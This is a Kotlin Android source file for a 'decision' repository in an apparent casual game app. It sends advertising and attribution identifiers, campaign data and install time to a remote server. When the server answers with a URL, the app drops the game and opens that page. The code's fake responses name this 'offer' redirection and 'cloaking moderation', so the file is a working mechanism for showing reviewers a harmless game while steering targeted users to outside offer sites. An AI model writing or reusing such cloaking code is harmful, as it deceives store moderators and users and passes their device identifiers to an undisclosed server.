package com.chicken.egglightsaga.data.decision

import android.content.Context
import android.util.Log
import com.chicken.egglightsaga.domain.model.DecisionInput
import com.chicken.egglightsaga.domain.model.DecisionResult
import com.chicken.egglightsaga.domain.repository.DecisionRepository
import dagger.hilt.android.qualifiers.ApplicationContext
import javax.inject.Inject
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.HttpUrl
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject

class RemoteDecisionRepository
@Inject
constructor(private val client: OkHttpClient, @ApplicationContext private val context: Context) :
        DecisionRepository {

    companion object {
        private const val TAG = "RemoteDecisionRepo"
        private const val BASE_URL = "https://wizard-eggsaga.fun/api/v11c"
        private const val BUNDLE_ID = "com.chicken.egglightsaga"
    }

    override suspend fun getDecision(input: DecisionInput): DecisionResult {
        val USE_FAKE = false

        if (USE_FAKE) {
            return getFakeDecision(input)
        }

        return withContext(Dispatchers.IO) {
            try {
                val queryUrl = buildUrl(input)

                Log.d(TAG, "---------------------------------------")
                Log.d(TAG, "REQUEST START")
                Log.d(TAG, "URL: $queryUrl")

                val request = Request.Builder().url(queryUrl).get().build()

                Log.d(TAG, "HEADERS:")
                request.headers.forEach { h -> Log.d(TAG, "${h.first}: ${h.second}") }

                val response = client.newCall(request).execute()

                Log.d(TAG, "---------------------------------------")
                Log.d(TAG, "RESPONSE CODE: ${response.code}")

                val bodyString = response.body?.string().orEmpty()
                Log.d(TAG, "BODY: $bodyString")

                if (!response.isSuccessful) {
                    return@withContext DecisionResult(
                            is_intro_completed = true,
                            targetUrl = null,
                            reason = "HTTP error ${response.code}"
                    )
                }

                if (bodyString.isBlank()) {
                    return@withContext DecisionResult(
                            is_intro_completed = true,
                            targetUrl = null,
                            reason = "Empty server response"
                    )
                }

                val json = JSONObject(bodyString)
                val url = json.optString("url", "")

                if (url.isBlank()) {
                    return@withContext DecisionResult(
                            is_intro_completed = true,
                            targetUrl = null,
                            reason = "No URL in server response"
                    )
                }

                DecisionResult(is_intro_completed = false, targetUrl = url, reason = "Server URL")
            } catch (e: Exception) {
                Log.e(TAG, "❌ Exception: ${e.message}", e)

                DecisionResult(
                        is_intro_completed = true,
                        targetUrl = null,
                        reason = "Exception: ${e.message}"
                )
            }
        }
    }

    private suspend fun getFakeDecision(input: DecisionInput): DecisionResult {
        val variant = 2

        return when (variant) {
            1 -> {
                val fakeJson =
                        """
                {
                    "visitor_id": "1234567890",
                    "url": "https://beton.ua"
                }
            """.trimIndent()

                Log.d(TAG, "FAKE JSON: $fakeJson")

                DecisionResult(
                        is_intro_completed = false,
                        targetUrl = "https://beton.ua",
                        reason = "Fake offer response"
                )
            }
            2 -> {
                val fakeJson =
                        """
                {
                    "app_open_id_m": "441953488",
                    "engagement_id_m": "94134039-0dfd-45be-ba41-580d83ff6a55",
                    "is_first_engagement": false
                }
            """.trimIndent()

                Log.d(TAG, "FAKE JSON: $fakeJson")

                DecisionResult(
                        is_intro_completed = true,
                        targetUrl = null,
                        reason = "Fake cloaking moderation"
                )
            }
            else ->
                    DecisionResult(
                            is_intro_completed = true,
                            targetUrl = null,
                            reason = "Fake fallback"
                    )
        }
    }

    private fun buildUrl(input: DecisionInput): String {
        val cloak = input.cloakInfo

        val advertisingId = cloak.advertisingId ?: ""
        val appsflyerId = cloak.appsflyerDeviceId ?: ""
        val campaign = cloak.campaign ?: ""
        val utmSource = cloak.utmSource ?: ""
        val utmMedium = cloak.utmMedium ?: ""
        val installTime = cloak.installTime ?: ""
        val deepLink = cloak.deepLink ?: ""

        val url =
                HttpUrl.Builder()
                        .scheme("https")
                        .host("wizard-eggsaga.fun")
                        .addPathSegments("api/v11c")
                        .addQueryParameter("bundle_id", BUNDLE_ID)
                        .addQueryParameter("advertising_id", advertisingId)
                        .addQueryParameter("appsflyer_device_id", appsflyerId)
                        .addQueryParameter("campaign", campaign)
                        .addQueryParameter("utm_source", utmSource)
                        .addQueryParameter("utm_medium", utmMedium)
                        .addQueryParameter("install_time", installTime)
                        .addQueryParameter("deep", deepLink)
                        .build()
                        .toString()

        Log.d(TAG, "BUILT URL: $url")
        return url
    }
}
